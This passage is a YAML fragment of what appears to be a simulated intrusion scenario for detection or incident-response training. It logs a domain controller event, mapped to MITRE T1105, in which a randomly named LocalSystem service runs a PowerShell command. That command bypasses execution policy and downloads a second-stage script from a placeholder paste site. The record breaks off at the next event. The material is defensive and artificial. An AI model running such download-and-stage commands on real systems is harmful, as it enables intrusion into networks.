  # ---- Second-stage payload ----------------------------------------------
  - id: dc-download-payload
    at: "+3h7m52s"
    event_type: malware_download
    log_sources: [windows]
    severity: critical
    actor: dmontoya
    host: dccore01
    description: >
      A service running as LocalSystem downloads a second-stage PowerShell
      script from a public paste site. Outbound HTTPS from a domain
      controller to a paste site is, on its own, sufficient grounds to
      declare an incident.
    mitre:
      technique_id: T1105
      technique_name: "Ingress Tool Transfer"
      tactic: Command and Control
    service:
      service_name: GBZRTNWQVKMDPFXCLJYH
      image_path: '%COMSPEC% /C "PowerShell -ExecutionPolicy Bypass -NoProfile -Command Invoke-WebRequest -Uri https://paste.example/raw/Qk7mNv3T -OutFile C:\ProgramData\svccache\sysprep-helper.ps1"'
      start_type: demand start
      account: LocalSystem
    file:
      path: C:\ProgramData\svccache\sysprep-helper.ps1
      filename: sysprep-helper.ps1
      sha256: "1d6b90fa47c3e825b0f194ce73a26d5081bf3947ce20a851d63f709b4c2e8035"
      size_bytes: 9214

  - id: dc-execute-payload
    at: "+3h9m38s"
